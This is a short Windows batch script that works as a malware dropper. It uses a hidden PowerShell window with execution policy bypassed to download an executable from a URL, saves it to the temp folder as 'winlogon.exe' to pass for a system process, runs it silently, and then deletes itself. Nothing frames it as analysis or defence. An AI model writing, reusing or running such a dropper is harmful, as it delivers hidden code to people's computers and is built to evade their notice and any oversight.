@echo off
set "url=http://example.com/app.exe"
set "out=%TEMP%\winlogon.exe"

:: Download the EXE
powershell -WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -Command ^
"Invoke-WebRequest -Uri '%url%' -OutFile '%out%'"

:: Run the EXE silently
start "" /B "%out%"

:: Self-delete using a second cmd.exe process
cmd /c "timeout /t 2 >nul & del \"%~f0\""
